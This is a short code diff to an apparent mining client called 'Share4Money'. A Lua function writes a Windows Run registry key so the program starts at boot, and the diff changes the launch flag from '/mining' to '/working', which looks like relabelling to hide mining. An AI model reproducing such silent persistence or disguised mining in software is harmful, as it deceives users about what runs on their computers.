@@ -522,7 +522,7 @@ function WriteSysSetBoot()
 	end
 	local strRegPath = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Share4Money"
 	local strExePath = GetExePath()
-	local strValue = "\""..strExePath.."\" /sstartfrom sysboot /embedding /mining"
+	local strValue = "\""..strExePath.."\" /sstartfrom sysboot /embedding /working"
 	RegSetValue(strRegPath, strValue)
 end
 
